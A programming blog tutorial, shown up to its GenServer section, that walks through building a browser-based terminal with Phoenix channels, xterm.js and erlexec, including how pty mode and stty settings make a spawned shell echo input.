<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta http-equiv='X-UA-Compatible' content='IE=edge;chrome=1'/>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Hostile Developer - Something Useless - Terminal in your browser</title>
  <link href="/favicon.ico" rel="icon" type="image/ico" />
  <link href="/stylesheets/application.css" rel="stylesheet" type="text/css" />
  <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml" />
</head>
<body>
<div id="container">
  <section id="header">
  <header>
<a href="/">        <h1 class="brand"><span class="hostile">Hostile</span> Developer</h1>
        <h4 class="tag-line">I am Steven. Hear me Rant.</h4>
</a>  </header>

  <section class='social'>
    <a target="_blank" href="http://twitter.com/_StevenNunez/"><i class="fa fa-twitter"></i></a>
    <a target="_blank" href="https://github.com/StevenNunez/"><i class="fa fa-github"></i></a>
  </section>
</section>


  <main id='article' role="main">
    <h1 class="article-title"><a href="/2017/05/02/something-useless-terminal-in-your-browser.html">Something Useless - Terminal in your browser</a></h1>
    <p>In today&rsquo;s installment of Something Useless, we&rsquo;re going to build a terminal in your browser with Phoenix!
This post will be broken up into 3 sections.</p>

<ul>
<li>Setting up Phoenix and Channels</li>
<li>Creating a GenServer to act as a proxy for our Shell</li>
<li>Tying it all together</li>
</ul>

<h2>Getting Started</h2>

<p>Create a new Phoenix Application. We&rsquo;ll be using Phoenix 1.3.</p>
<div class="highlight"><pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>mix phx.new terminal_in_your_browser <span class="nt">--no-ecto</span>
<span class="c"># Install all your dependencies</span>
<span class="nb">cd </span>terminal_in_your_browser
</pre></td></tr></tbody></table></code></pre></div>
<p>Let&rsquo;s start by getting the terminal on the page. Start by adding the <code>xterm</code> package.</p>
<div class="highlight"><pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nb">cd </span>assets
npm install <span class="nt">--save</span> xterm
<span class="nb">cd</span> ..
</pre></td></tr></tbody></table></code></pre></div>
<p>Then edit <code>brunch-config.js</code> to load the styles for the plugin. Without this&hellip; it&rsquo;s just a <code>textarea</code>.</p>
<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="c1">// brunch-config.js</span>
<span class="c1">// ...</span>
<span class="nx">npm</span><span class="p">:</span> <span class="p">{</span>
 <span class="nl">enabled</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
 <span class="nx">styles</span><span class="p">:</span> <span class="p">{</span>
   <span class="s2">"xterm"</span><span class="p">:</span> <span class="p">[</span><span class="s2">"dist/xterm.css"</span><span class="p">],</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="c1">// ...</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Clear out <code>page/index.html.eex</code> and insert a <code>div</code> with an id of <code>terminal-container</code>.</p>
<div class="highlight"><pre class="highlight html"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="c">&lt;!-- lib/terminal_in_your_browser/web/templates/page/index.html.eex --&gt;</span>
<span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"terminal-container"</span><span class="nt">&gt;&lt;/div&gt;</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Finally, in <code>assets/js/app.js</code> load <code>xterm</code> and load it on the page:</p>
<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="k">import</span> <span class="nx">Terminal</span> <span class="k">from</span> <span class="s1">'xterm'</span>

<span class="kd">let</span> <span class="nx">term</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Terminal</span><span class="p">({</span>
  <span class="na">cursorBlink</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
<span class="p">})</span>

<span class="nx">term</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'terminal-container'</span><span class="p">))</span>
<span class="nx">term</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'data'</span><span class="p">,</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>That last bit will console.log every character you type. Off to a great start!</p>

<h2>Flipping Channels</h2>

<p>Now we get to work with some Channels!</p>

<p>Let&rsquo;s create the Terminal Channel. We&rsquo;ll use to receive input from our <code>xterm</code> box in the browser.</p>
<div class="highlight"><pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>mix phx.gen.channel Terminal
</pre></td></tr></tbody></table></code></pre></div>
<p>Follow the instructions and but instead, add this to <code>user_socket.ex</code></p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">channel</span> <span class="sd">"</span><span class="s2">terminal:*"</span><span class="p">,</span> <span class="no">TerminalInYourBrowser</span><span class="o">.</span><span class="no">Web</span><span class="o">.</span><span class="no">TerminalChannel</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Let&rsquo;s clean up the <code>TerminalChannel</code> module to only include a <code>join/3</code> function allows anyone to join.</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="k">defmodule</span> <span class="no">TerminalInYourBrowser</span><span class="o">.</span><span class="no">Web</span><span class="o">.</span><span class="no">TerminalChannel</span> <span class="k">do</span>
  <span class="kn">use</span> <span class="no">TerminalInYourBrowser</span><span class="o">.</span><span class="no">Web</span><span class="p">,</span> <span class="ss">:channel</span>

  <span class="k">def</span> <span class="n">join</span><span class="p">(</span><span class="sd">"</span><span class="s2">terminal:"</span> <span class="o">&lt;&gt;</span> <span class="n">id</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">socket</span><span class="p">)</span> <span class="k">do</span>
    <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="n">socket</span><span class="p">}</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>The fun part. Let&rsquo;s echo everything you type back to you from the channel.</p>

<p>In the channel add this:</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="n">handle_in</span><span class="p">(</span><span class="sd">"</span><span class="s2">input"</span><span class="p">,</span> <span class="p">%{</span><span class="sd">"</span><span class="s2">input"</span> <span class="o">=&gt;</span> <span class="n">input</span><span class="p">},</span> <span class="n">socket</span><span class="p">)</span> <span class="k">do</span>
  <span class="n">push</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="sd">"</span><span class="s2">output"</span><span class="p">,</span> <span class="p">%{</span><span class="ss">output:</span> <span class="n">input</span><span class="p">})</span>
  <span class="p">{</span><span class="ss">:noreply</span><span class="p">,</span> <span class="n">socket</span><span class="p">}</span>
<span class="k">end</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>We push the input back to the client with an event named <code>output</code>. Our current code doesn&rsquo;t know how to handle this but it will soon. The <code>{:noreply, socket}</code> just tells phoenix not to reply to the sender, and preserves the socket to this process.</p>

<p>Next up. let&rsquo;s edit the <code>socket.js</code> file Phoenix provides us:</p>
<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre><span class="k">import</span> <span class="p">{</span><span class="nx">Socket</span><span class="p">}</span> <span class="k">from</span> <span class="s2">"phoenix"</span>                  

<span class="kd">let</span> <span class="nx">socket</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Socket</span><span class="p">(</span><span class="s2">"/socket"</span><span class="p">,</span> <span class="p">{})</span>

<span class="nx">socket</span><span class="p">.</span><span class="nx">connect</span><span class="p">()</span>                                

<span class="k">export</span> <span class="k">default</span> <span class="nx">socket</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Initialize a socket, connect, and export. Super simple. We&rsquo;ll use this socket in <code>app.js</code>. Add this near the top of the file.</p>
<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">import</span> <span class="nx">socket</span> <span class="k">from</span> <span class="s1">'./socket'</span>                   

<span class="kd">let</span> <span class="nx">channel</span> <span class="o">=</span> <span class="nx">socket</span><span class="p">.</span><span class="nx">channel</span><span class="p">(</span><span class="s2">"terminal:1"</span><span class="p">,</span> <span class="p">{})</span>
<span class="nx">channel</span><span class="p">.</span><span class="nx">join</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>With this, we&rsquo;re connected to our server! Refresh the page and checkout the logs.</p>
<div class="highlight"><pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="o">[</span>info] JOIN <span class="s2">"terminal:1"</span> to TerminalInYourBrowser.Web.TerminalChannel
  Transport:  Phoenix.Transports.WebSocket
  Parameters: %<span class="o">{}</span>
<span class="o">[</span>info] Replied terminal:1 :ok
</pre></td></tr></tbody></table></code></pre></div>
<p>NICE! Let&rsquo;s wrap this leg of the trip up by sending all terminal input to our channel, then respond to the <code>output</code> event we send from the channel.</p>

<p>In the end, your <code>app.js</code> should look like this:</p>
<div class="highlight"><pre class="highlight javascript"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="k">import</span> <span class="nx">Terminal</span> <span class="k">from</span> <span class="s1">'xterm'</span>
<span class="k">import</span> <span class="nx">socket</span> <span class="k">from</span> <span class="s1">'./socket'</span>

<span class="kd">let</span> <span class="nx">channel</span> <span class="o">=</span> <span class="nx">socket</span><span class="p">.</span><span class="nx">channel</span><span class="p">(</span><span class="s2">"terminal:1"</span><span class="p">,</span> <span class="p">{})</span>
<span class="nx">channel</span><span class="p">.</span><span class="nx">join</span><span class="p">()</span>
<span class="nx">channel</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'output'</span><span class="p">,</span> <span class="p">({</span><span class="nx">output</span><span class="p">})</span> <span class="o">=&gt;</span> <span class="nx">term</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">output</span><span class="p">))</span> <span class="c1">// From the Channel</span>

<span class="kd">let</span> <span class="nx">term</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Terminal</span><span class="p">({</span>
  <span class="na">cursorBlink</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
<span class="p">})</span>


<span class="nx">term</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'terminal-container'</span><span class="p">))</span>
<span class="nx">term</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">'data'</span><span class="p">,</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">channel</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s1">'input'</span><span class="p">,</span> <span class="p">{</span><span class="na">input</span><span class="p">:</span> <span class="nx">data</span><span class="p">}))</span> <span class="c1">// To the Channel</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Lines where we send IO back and forth are marked in comments. Look! Our terminal&hellip; just returns what we typed. Not super exciting. Up next, we&rsquo;ll be delving into the bowels of Unix, and learning how to interact with external processes.</p>

<h2>Ports, ptys, AKA why did I choose to write about this?!</h2>

<p>Erlang comes with a built in way to communicate with external programs called <code>Ports</code>. With a port you can spawn a process like a shell, or a ruby script and communicate via IO. I can send it messages with <code>Port.command/2</code>, and receive formatted responses in the calling process. This has some limitations for our purposes. We need a terminal that sends back an echo when we type. As you saw, our terminal doesn&rsquo;t actually put anything in the box UNLESS we send it. We <em>could</em> write this ourselves but why. *nix has us covered. If you dig a bit deeper, you figure out that the reason it doesn&rsquo;t echo your input is because it&rsquo;s not a PTY. Let&rsquo;s look at an example. In <code>iex</code> type the following:</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="n">iex</span><span class="p">(</span><span class="m">1</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">port</span> <span class="o">=</span> <span class="no">Port</span><span class="o">.</span><span class="n">open</span><span class="p">({</span><span class="ss">:spawn</span><span class="p">,</span> <span class="sd">"</span><span class="s2">$SHELL"</span><span class="p">},</span> <span class="p">[])</span>
<span class="c1">#Port&lt;0.1355&gt;</span>
<span class="n">iex</span><span class="p">(</span><span class="m">2</span><span class="p">)</span><span class="o">&gt;</span> <span class="no">Port</span><span class="o">.</span><span class="n">command</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="sd">"</span><span class="s2">ls\n"</span><span class="p">)</span>              
<span class="no">true</span>
<span class="n">iex</span><span class="p">(</span><span class="m">3</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">flush</span><span class="p">()</span>
<span class="p">{</span><span class="c1">#Port&lt;0.1355&gt;,</span>
 <span class="p">{</span><span class="ss">:data</span><span class="p">,</span> <span class="s1">'assets\n_build\nconfig\ndeps\nlib\nmix.exs\nmix.lock\npriv\nREADME.md\ntest\n'</span><span class="p">}}</span>
<span class="ss">:ok</span>
<span class="n">iex</span><span class="p">(</span><span class="m">4</span><span class="p">)</span><span class="o">&gt;</span> <span class="no">Port</span><span class="o">.</span><span class="n">command</span><span class="p">(</span><span class="n">port</span><span class="p">,</span> <span class="sd">"</span><span class="s2">l"</span><span class="p">)</span>   
<span class="no">true</span>
<span class="n">iex</span><span class="p">(</span><span class="m">5</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">flush</span><span class="p">()</span>
<span class="c1"># no echo</span>
<span class="ss">:ok</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>It might be hard to see, but when we flush on <code>3</code> we get back the response we see the port sent us a message. On <code>5</code>, no joy, no echo which we need to make our terminal work. Also, we don&rsquo;t get our lovely prompt.</p>

<p>The thing that causes the terminal to echo are the settings of the <code>stty</code> command. You can see your current settings by typing in <code>stty --all</code>. Mine look like this:</p>
<div class="highlight"><pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>stty <span class="nt">--all</span>
speed 38400 baud<span class="p">;</span> rows 23<span class="p">;</span> columns 96<span class="p">;</span> line <span class="o">=</span> 0<span class="p">;</span>
intr <span class="o">=</span> ^C<span class="p">;</span> quit <span class="o">=</span> ^<span class="se">\;</span> erase <span class="o">=</span> ^?<span class="p">;</span> <span class="nb">kill</span> <span class="o">=</span> ^U<span class="p">;</span> eof <span class="o">=</span> ^D<span class="p">;</span> eol <span class="o">=</span> M-^?<span class="p">;</span> eol2 <span class="o">=</span> M-^?<span class="p">;</span> swtch <span class="o">=</span> M-^?<span class="p">;</span>
start <span class="o">=</span> ^Q<span class="p">;</span> stop <span class="o">=</span> ^S<span class="p">;</span> susp <span class="o">=</span> ^Z<span class="p">;</span> rprnt <span class="o">=</span> ^R<span class="p">;</span> werase <span class="o">=</span> ^W<span class="p">;</span> lnext <span class="o">=</span> ^V<span class="p">;</span> discard <span class="o">=</span> ^O<span class="p">;</span>
min <span class="o">=</span> 1<span class="p">;</span> <span class="nb">time</span> <span class="o">=</span> 0<span class="p">;</span>
<span class="nt">-parenb</span> <span class="nt">-parodd</span> <span class="nt">-cmspar</span> cs8 hupcl <span class="nt">-cstopb</span> cread <span class="nt">-clocal</span> <span class="nt">-crtscts</span>
<span class="nt">-ignbrk</span> brkint <span class="nt">-ignpar</span> <span class="nt">-parmrk</span> <span class="nt">-inpck</span> <span class="nt">-istrip</span> <span class="nt">-inlcr</span> <span class="nt">-igncr</span> icrnl ixon <span class="nt">-ixoff</span> <span class="nt">-iuclc</span> ixany
imaxbel iutf8
opost <span class="nt">-olcuc</span> <span class="nt">-ocrnl</span> onlcr <span class="nt">-onocr</span> <span class="nt">-onlret</span> <span class="nt">-ofill</span> <span class="nt">-ofdel</span> nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten <span class="nb">echo </span>echoe echok <span class="nt">-echonl</span> <span class="nt">-noflsh</span> <span class="nt">-xcase</span> <span class="nt">-tostop</span> <span class="nt">-echoprt</span> echoctl echoke
<span class="nt">-flusho</span> <span class="nt">-extproc</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>If you run <code>stty -echo</code> you&rsquo;ll see it turns your echo off! Sadly, running <code>stty echo</code> on our port doesn&rsquo;t make it echo. Instead, we get a weird error:</p>
<div class="highlight"><pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>iex<span class="o">(</span>6<span class="o">)&gt;</span> Port.command<span class="o">(</span>port, <span class="s2">"stty echo</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span>
<span class="nb">true
</span>iex<span class="o">(</span>7<span class="o">)&gt;</span> stty: <span class="s1">'standard input'</span>: Inappropriate ioctl <span class="k">for </span>device
</pre></td></tr></tbody></table></code></pre></div>
<p>Womp. This error is essentially telling us our port isn&rsquo;t a pty. To get around this, we&rsquo;re going to bring in a library that &lsquo;provides significantly better control over OS processes than built-in <code>erlang:open_port/3</code> command&rsquo;. It also has pty support. The library we&rsquo;re talking about is <code>erlexec</code>.</p>

<h2>erlexec</h2>

<p>With <code>erlexec</code>, we&rsquo;ll be able to get around this pesky pty issue, and turn on our terminal echo. Let&rsquo;s get it setup.</p>

<p>In our <code>mix.exs</code>, let&rsquo;s add the latest version of <code>erlexec</code>. Your deps should look like this.</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="k">defp</span> <span class="n">deps</span> <span class="k">do</span>
  <span class="p">[{</span><span class="ss">:phoenix</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 1.3.0-rc"</span><span class="p">},</span>
   <span class="p">{</span><span class="ss">:phoenix_pubsub</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 1.0"</span><span class="p">},</span>
   <span class="p">{</span><span class="ss">:phoenix_html</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 2.6"</span><span class="p">},</span>
   <span class="p">{</span><span class="ss">:phoenix_live_reload</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 1.0"</span><span class="p">,</span> <span class="ss">only:</span> <span class="ss">:dev</span><span class="p">},</span>
   <span class="p">{</span><span class="ss">:gettext</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 0.11"</span><span class="p">},</span>
   <span class="p">{</span><span class="ss">:cowboy</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 1.0"</span><span class="p">},</span>
   <span class="p">{</span><span class="ss">:erlexec</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 1.7"</span><span class="p">},</span>
  <span class="p">]</span>
<span class="k">end</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>If you&rsquo;re running elixir &gt;= 1.4, you won&rsquo;t need to start the application. If you aren&rsquo;t, make sure you add <code>:erlexec</code> to your application list.</p>

<p>Run <code>mix deps.get</code>, then run <code>iex -S mix</code> to try it out.</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">iex</span><span class="p">(</span><span class="m">1</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">_os_pid</span><span class="p">}</span> <span class="o">=</span> <span class="ss">:exec</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">'$SHELL'</span><span class="p">,</span> <span class="p">[</span><span class="ss">:stdin</span><span class="p">,</span> <span class="ss">:stdout</span><span class="p">,</span> <span class="ss">:stderr</span><span class="p">,</span> <span class="ss">:pty</span><span class="p">])</span>
<span class="n">iex</span><span class="p">(</span><span class="m">2</span><span class="p">)</span><span class="o">&gt;</span> <span class="ss">:exec</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="sd">"</span><span class="s2">l"</span><span class="p">)</span>                                                    
<span class="n">iex</span><span class="p">(</span><span class="m">3</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">flush</span><span class="p">()</span>
<span class="p">{</span><span class="ss">:stdout</span><span class="p">,</span> <span class="m">10721</span><span class="p">,</span>
 <span class="sd">"</span><span class="s2">\e]0;stevennunez@TashiDor: ~/code/blog_code/terminal_in_your_browser\astevennunez@TashiDor:~/code/blog_code/terminal_in_your_browser$ "</span><span class="p">}</span>

</pre></td></tr></tbody></table></code></pre></div>
<p>We start our default shell with the <code>:stdin</code> option so it accepts input from use via <code>:exec.send/2</code>. <code>:stdout</code> and <code>:stderr</code> make it so the calling process receives output in a tagged tuple starting with <code>:stdout</code> and <code>:stderr</code>.
Notice that the only message we&rsquo;ve received so far is our terminal prompt. Also note that we&rsquo;re not getting an echo from the <code>l</code> we sent in.</p>

<p>Next, we&rsquo;ll finish up the <code>ls\n</code> command by passing in the rest.</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="n">iex</span><span class="p">(</span><span class="m">4</span><span class="p">)</span><span class="o">&gt;</span> <span class="ss">:exec</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="sd">"</span><span class="s2">s\n"</span><span class="p">)</span>
<span class="n">iex</span><span class="p">(</span><span class="m">5</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">flush</span><span class="p">()</span>
<span class="p">{</span><span class="ss">:stdout</span><span class="p">,</span> <span class="m">10721</span><span class="p">,</span>
 <span class="sd">"</span><span class="s2">\e[0m\e[01;34massets\e[0m  \e[01;34m_build\e[0m  \e[01;34mconfig\e[0m  \e[01;34mdeps\e[0m  \e[01;34mlib\e[0m  mix.exs  mix.lock  \e[01;34mpriv\e[0m  README.md  \e[01;34mtest\e[0m\r\n"</span><span class="p">}</span>
<span class="p">{</span><span class="ss">:stdout</span><span class="p">,</span> <span class="m">10721</span><span class="p">,</span>
 <span class="sd">"</span><span class="s2">\e]0;stevennunez@TashiDor: ~/code/blog_code/terminal_in_your_browser\astevennunez@TashiDor:~/code/blog_code/terminal_in_your_browser$ "</span><span class="p">}</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Here we get a file list. The wacky <code>\e[om\e</code> characters are for formatting in the terminal program. All <code>xterm.js</code> compatible!</p>

<p>Let&rsquo;s try turning on the echo via <code>stty</code> settings.</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">iex</span><span class="p">(</span><span class="m">6</span><span class="p">)</span><span class="o">&gt;</span> <span class="ss">:exec</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="sd">"</span><span class="s2">stty echo\n"</span><span class="p">)</span>
<span class="n">iex</span><span class="p">(</span><span class="m">7</span><span class="p">)</span><span class="o">&gt;</span> <span class="ss">:exec</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="sd">"</span><span class="s2">l"</span><span class="p">)</span>          
<span class="n">iex</span><span class="p">(</span><span class="m">8</span><span class="p">)</span><span class="o">&gt;</span> <span class="ss">:exec</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="sd">"</span><span class="s2">s"</span><span class="p">)</span>
<span class="n">iex</span><span class="p">(</span><span class="m">9</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">flush</span><span class="p">()</span>
<span class="p">{</span><span class="ss">:stdout</span><span class="p">,</span> <span class="m">10721</span><span class="p">,</span>
 <span class="sd">"</span><span class="s2">\e]0;stevennunez@TashiDor: ~/code/blog_code/terminal_in_your_browser\astevennunez@TashiDor:~/code/blog_code/terminal_in_your_browser$ "</span><span class="p">}</span>
<span class="p">{</span><span class="ss">:stdout</span><span class="p">,</span> <span class="m">10721</span><span class="p">,</span> <span class="sd">"</span><span class="s2">l"</span><span class="p">}</span>
<span class="p">{</span><span class="ss">:stdout</span><span class="p">,</span> <span class="m">10721</span><span class="p">,</span> <span class="sd">"</span><span class="s2">s"</span><span class="p">}</span>

</pre></td></tr></tbody></table></code></pre></div>
<p>ECHO!</p>

<p>A couple of things to note:</p>

<ol>
<li><code>{:ok, pid, _os_pid} = :exec.run(&#39;$SHELL&#39;, [:stdin, :stdout, :stderr, :pty])</code>. Note the single quotes. This <strong>has</strong> to be an Erlang String or Elixir Charlist, which is in single quotes.</li>
<li><code>:exec.send(pid, &quot;ls\n&quot;)</code> Double quotes when you <code>:exec.send</code></li>
</ol>

<h2>GenServer time</h2>

<p>Let&rsquo;s wrap all of this in a <code>GenServer</code>. The server will have a way to receive input as well as a way to notify a process (our socket process) when there&rsquo;s something to output.</p>

<p>Step 1: Make a module named <code>Terminal</code> that uses <code>GenServer</code></p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">defmodule</span> <span class="no">Terminal</span> <span class="k">do</span>
  <span class="kn">use</span> <span class="no">GenServer</span>

<span class="k">end</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Step 2: Create <code>start_link/1</code> and the <code>init/1</code> callback to receive and store the output_pid:</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="k">defmodule</span> <span class="no">Terminal</span> <span class="k">do</span>
  <span class="kn">use</span> <span class="no">GenServer</span>

  <span class="k">def</span> <span class="n">start_link</span><span class="p">(</span><span class="n">output_pid</span><span class="p">)</span> <span class="k">do</span>
    <span class="no">GenServer</span><span class="o">.</span><span class="n">start_link</span><span class="p">(</span><span class="bp">__MODULE__</span><span class="p">,</span> <span class="n">output_pid</span><span class="p">)</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="n">init</span><span class="p">(</span><span class="n">output_pid</span><span class="p">)</span> <span class="k">do</span>
    <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="p">%{</span><span class="ss">output_pid:</span> <span class="n">output_pid</span><span class="p">}}</span>
  <span class="k">end</span>
<span class="k">end</span>
</pre></td></tr></tbody></table></code></pre></div>
<p>Step 3: In the <code>init/1</code> callback, start a pty shell and set it up to echo on input:</p>
<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="k">defmodule</span> <span class="no">Terminal</span> <span class="k">do</span>
  <span class="kn">use</span> <span class="no">GenServer</span>
  <span class="c1">#... start_link omitted</span>
  <span class="k">def</span> <span class="n">init</span><span class="p">(</span><span class="n">output_pid</span><span class="p">)</span> <span class="k">do</span>
    <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="n">shell</span><span class="p">,</span> <span class="n">_os_pid</span><span class="p">}</span> <span class="o">=</span> <span class="ss">:exec</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">'$SHELL'</span><span class="p">,</span> <span class="p">[</span><span class="ss">:stdin</span><span class="p">,</span> <span class="ss">:stdout</span><span class="p">,</span> <span class="ss">:stderr</span><span class="p">,</span> <span class="ss">:pty</span><span class="p">])</span>
    <span class="ss">:exec</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">shell</span><span class="p">,</span> <span class="sd">"</span><span class="s2">stty echo\n"</span><span class="p">)</span>

    <span class="p">{</span><span class="ss">:ok</span><span class="p">,</span> <span class="p">%{</span>
      <span class="ss">output_pid:</span> <span class="n">output_pid</span><span class="p">,</span>
      <span class="ss">shell:</span> <span class="n">shell</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="k">end</span>
<span class="k">end</span>
